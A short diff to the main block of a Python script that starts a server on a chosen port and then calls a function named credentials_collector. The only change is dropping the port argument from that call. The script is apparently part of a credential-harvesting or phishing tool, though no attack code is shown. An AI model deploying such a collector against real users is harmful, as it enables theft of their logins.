@@ -48,7 +48,7 @@ if __name__ == "__main__":
         server_runner.server_selection(port)
 
         multiprocessing.Process(target=server_runner.start_server, args=(port,)).start()
-        simple_informant.credentials_collector(port)
+        simple_informant.credentials_collector()
 
     except KeyboardInterrupt:
         port = '8080' # When Keyword Interrupt Occurs before defining Port by User. Script will use 8080 port.(Just To Remove Exception Errors)
